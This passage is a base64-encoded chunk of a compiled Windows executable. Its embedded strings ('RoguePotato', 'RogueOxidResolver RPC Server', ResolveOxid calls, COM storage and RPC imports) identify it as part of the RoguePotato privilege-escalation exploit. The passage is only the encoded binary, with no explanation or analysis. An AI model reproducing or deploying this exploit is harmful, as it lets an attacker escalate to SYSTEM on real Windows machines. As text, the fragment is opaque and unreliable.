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QoQgAAAAAA/////wAAAAAMAAAADEBAAAAAAADAJEAAAAAAAGAKQgADAAAAcApCADQKQgDgD0IAAAAAAOQoQgAAAAAA/////wAAAAAMAAAA0j9AAAAAAAD+////AAAAANj///8AAAAA/v///5BEQACeREAAAAAAAP7///8AAAAA0P///wAAAAD+////AAAAAJ1XQAAAAAAAVFdAAF5XQAD+////AAAAAKT///8AAAAA/v///wAAAACvVUAAAAAAAPlUQAADVUAAQAAAAAAAAAAAAAAAUVZAAP////8AAAAA/////wAAAAAAAAAAAAAAAAEAAAABAAAAAAtCACIFkxkCAAAAEAtCAAEAAAAgC0IAAAAAAAAAAAAAAAAAAQAAAP7///8AAAAA0P///wAAAAD+////cUxAAHVMQAAAAAAA/v///wAAAADY////AAAAAP7///8eTUAAIk1AAAAAAADAJEAAAAAAAKQLQgACAAAAsAtCAOAPQgAAAAAABClCAAAAAAD/////AAAAAAwAAAAbVEAAAAAAAP7///8AAAAA2P///wAAAAD+////PWRAAE1kQAAAAAAA/v///wAAAADY////AAAAAP7///8AAAAAUWNAAAAAAAD+////AAAAANT///8AAAAA/v///wAAAADUZ0AAAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAHlnQAD/////+npBACIFkxkBAAAATAxCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAP7///8AAAAA1P///wAAAAD+////AAAAAFexQAAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAebpAAAAAAAD+////AAAAANT///8AAAAA/v///wAAAAD8u0AAAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAKG7QAAAAAAA/v///wAAAADY////AAAAAP7///9xwEAAdcBAAAAAAAD+////AAAAAND///8AAAAA/v///wAAAADmyEAAAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAG/JQAAAAAAA/v///wAAAAC0////AAAAAP7///8AAAAAG8pAAAAAAAD+////AAAAANT///8AAAAA/v///wAAAACAzUAAAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAGHUQAAAAAAA/v///wAAAADY////AAAAAP7///8AAAAAe9VAAAAAAAD+////AAAAANj///8AAAAA/v///wAAAADM1EAAAAAAAP7///8AAAAA2P///wAAAAD+////AAAAACHVQAAAAAAA/v///wAAAADU////AAAAAP7///8AAAAA5vVAAAAAAAD+////AAAAANj///8AAAAA/v///wAAAAAz8UAAAAAAAP7///8AAAAA0P///wAAAAD+////AAAAAKz+QAAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAKQdBAAAAAAD+////AAAAALz///8AAAAA/v///wAAAABUC0EAAAAAAP7///8AAAAA1P///wAAAAD+////AAAAABMJQQAAAAAA/v///wAAAADQ////AAAAAP7///8AAAAAUhJBAAAAAAD+////AAAAANT///8AAAAA/v///wAAAADyEkEAAAAAAP7///8AAAAA0P///wAAAAD+////AAAAALIbQQAAAAAA/v///wAAAADY////AAAAAP7///8wSkEATEpBAAAAAAD+////AAAAANT///8AAAAA/v///wAAAACbS0EAAAAAAP7///8AAAAAyP///wAAAAD+////AAAAANpNQQAAAAAA/v///wAAAADY////AAAAAP7///9Zc0EAbHNBAAMAAAAMEEIAxA9CAOAPQgAQAAAAJClCAAAAAAD/////AAAAAAwAAABgJUAAAAAAAEApQgAAAAAA/////wAAAAAMAAAAUCRAAAAAAADAJEAAAAAAALQPQgAAAAAAXClCAAAAAAD/////AAAAAAwAAAAgJUAArBACAAAAAAAAAAAA4hICAAyAAQAwEgIAAAAAAAAAAACiEwIAkIEBAPARAgAAAAAAAAAAAMoTAgBQgQEAoBACAAAAAAAAAAAABhQCAACAAQDQEQIAAAAAAAAAAACwFAIAMIEBAAAAAAAAAAAAAAAAAAAAAAAAAAAA1hMCAO4TAgAAAAAAeBICAIQSAgCWEgIArBICALwSAgDOEgIANBkCACYZAgAYGQIAChkCAP4YAgDqGAIA2hgCAGgSAgCyGAIAnhgCAIwYAgB8GAIAYhgCAEgYAgAuGAIAGBgCAAwYAgAAGAIA9hcCAOQXAgDUFwIAwBcCALQXAgBgEgIAyBgCAFQSAgCeFwIAkBcCALwUAgDYFAIA9hQCAAoVAgAeFQIAOhUCAFQVAgBqFQIAgBUCAJoVAgCwFQIAxBUCANYVAgDiFQIA9BUCAAAWAgASFgIAIhYCADIWAgBKFgIAYhYCAHoWAgCiFgIArhYCALwWAgDKFgIA1BYCAOIWAgD0FgIAAhcCABgXAgAoFwIANBcCAEoXAgBcFwIAbhcCAIAXAgBEGQIAAAAAAGwUAgCeFAIASBQCADAUAgASFAIAWhQCAIYUAgAAAAAAAQAAgAIAAIADAACADQAAgLwTAgBzAACACwAAgHQAAIAXAACABAAAgBAAAIAJAACArBMCAG8AAIATAACAAAAAAEoTAgA2EwIAhhMCABQTAgACEwIA8BICACQTAgBqEwIAAAAAAEwDSGVhcEZyZWUAAIEFU2xlZXAAZAJHZXRMYXN0RXJyb3IAAEgDSGVhcEFsbG9jALcCR2V0UHJvY2Vzc0hlYXAAANsFV2FpdEZvclNpbmdsZU9iamVjdAD2AENyZWF0ZVRocmVhZAAAsQJHZXRQcm9jQWRkcmVzcwAAewJHZXRNb2R1bGVIYW5kbGVXAABLRVJORUwzMi5kbGwAAIgAQ29UYXNrTWVtQWxsb2MAAAwAQ0xTSURGcm9tU3RyaW5nAF0AQ29Jbml0aWFsaXplAACNAENvVW5pbml0aWFsaXplAAAoAENvQ3JlYXRlSW5zdGFuY2UAALgBU3RnQ3JlYXRlRG9jZmlsZU9uSUxvY2tCeXRlcwAAogBDcmVhdGVJTG9ja0J5dGVzT25IR2xvYmFsAEkAQ29HZXRJbnN0YW5jZUZyb21JU3RvcmFnZQBvbGUzMi5kbGwAlQBmcmVlYWRkcmluZm8AAJYAZ2V0YWRkcmluZm8AV1MyXzMyLmRsbAAA4wBDcnlwdFN0cmluZ1RvQmluYXJ5QQAAfgBDcnlwdEJpbmFyeVRvU3RyaW5nQQAAQ1JZUFQzMi5kbGwA1wFScGNTZXJ2ZXJSZWdpc3RlckF1dGhJbmZvQQAA2gFScGNTZXJ2ZXJSZWdpc3RlcklmMgAAjQFScGNFcFJlZ2lzdGVyQQAA1gFScGNTZXJ2ZXJMaXN0ZW4A5wFScGNTZXJ2ZXJVc2VQcm90c2VxRXBBAADJAVJwY1NlcnZlcklucUJpbmRpbmdzAAAtAU5kclNlcnZlckNhbGwyAABSUENSVDQuZGxsAACxBVVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAAcQVTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAGgJHZXRDdXJyZW50UHJvY2VzcwCQBVRlcm1pbmF0ZVByb2Nlc3MAAIkDSXNQcm9jZXNzb3JGZWF0dXJlUHJlc2VudABPBFF1ZXJ5UGVyZm9ybWFuY2VDb3VudGVyABsCR2V0Q3VycmVudFByb2Nlc3NJZAAfAkdldEN1cnJlbnRUaHJlYWRJZAAA7AJHZXRTeXN0ZW1UaW1lQXNGaWxlVGltZQBmA0luaXRpYWxpemVTTGlzdEhlYWQAggNJc0RlYnVnZ2VyUHJlc2VudADTAkdldFN0YXJ0dXBJbmZvVwDTA0xvY2FsRnJlZQCpAUZvcm1hdE1lc3NhZ2VBAADVBFJ0bFVud2luZABkBFJhaXNlRXhjZXB0aW9uAAA0BVNldExhc3RFcnJvcgAAMAFFbmNvZGVQb2ludGVyADQBRW50ZXJDcml0aWNhbFNlY3Rpb24AAMEDTGVhdmVDcml0aWNhbFNlY3Rpb24AABMBRGVsZXRlQ3JpdGljYWxTZWN0aW9uAGIDSW5pdGlhbGl6ZUNyaXRpY2FsU2VjdGlvbkFuZFNwaW5Db3VudACiBVRsc0FsbG9jAACkBVRsc0dldFZhbHVlAKUFVGxzU2V0VmFsdWUAowVUbHNGcmVlAK4BRnJlZUxpYnJhcnkAxwNMb2FkTGlicmFyeUV4VwAAYQFFeGl0UHJvY2VzcwB6AkdldE1vZHVsZUhhbmRsZUV4VwAA1QJHZXRTdGRIYW5kbGUAABYGV3JpdGVGaWxlAHcCR2V0TW9kdWxlRmlsZU5hbWVXAADZAUdldENvbW1hbmRMaW5lQQDaAUdldENvbW1hbmRMaW5lVwCeAENvbXBhcmVTdHJpbmdXAAC1A0xDTWFwU3RyaW5nVwAAUQJHZXRGaWxlVHlwZQACBldpZGVDaGFyVG9NdWx0aUJ5dGUAeAFGaW5kQ2xvc2UAfgFGaW5kRmlyc3RGaWxlRXhXAACPAUZpbmROZXh0RmlsZVcAjwNJc1ZhbGlkQ29kZVBhZ2UAtQFHZXRBQ1AAAJoCR2V0T0VNQ1AAAMQBR2V0Q1BJbmZvAPMDTXVsdGlCeXRlVG9XaWRlQ2hhcgA6AkdldEVudmlyb25tZW50U3RyaW5nc1cAAK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